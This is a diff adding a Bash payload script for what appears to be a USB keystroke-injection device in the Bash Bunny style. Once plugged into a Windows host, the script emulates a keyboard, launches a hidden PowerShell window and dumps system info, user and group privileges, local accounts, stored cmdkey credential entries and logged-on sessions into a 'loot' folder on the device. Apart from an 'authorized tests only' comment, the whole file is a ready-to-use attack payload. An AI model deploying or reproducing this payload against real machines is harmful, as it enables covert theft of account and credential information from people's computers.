@@ -1,0 +1,23 @@
+#!/bin/bash
+# cred_recon (Windows host, HID+STORAGE) - dump account / credential context:
+#   systeminfo, whoami /all, local users, stored (cmdkey) secrets
+# into loot/. Authorized tests only.
+LED SETUP
+ATTACKMODE HID STORAGE
+sleep 3
+mkdir -p /root/udisk/loot
+LED STAGE1
+if [ ! -c /dev/hidg0 ]; then
+    echo "[!] /dev/hidg0 missing - no host attached"
+    LED R SINGLE; sleep 1; LED OFF; LED FINISH; exit 1
+fi
+QUACK "REM cred_recon" \
+    "DEFAULT_DELAY 40" \
+    "GUI r" "DELAY 400" \
+    "STRING powershell -NoP -W Hidden -c \"systeminfo | Out-File E:\\loot\\sysinfo.txt; whoami /all | Out-File E:\\loot\\whoami.txt; net user | Out-File E:\\loot\\netuser.txt; cmdkey /list | Out-File E:\\loot\\cmdkey.txt; Get-CimInstance Win32_LoggedOnUser | Out-File E:\\loot\\sessions.txt\"" "ENTER" \
+    "DELAY 12000"
+for f in sysinfo whoami netuser cmdkey sessions; do
+    [ -s "/root/udisk/loot/$f.txt" ] && echo "[+] loot/$f.txt"
+done
+LED FINISH
+exit 0
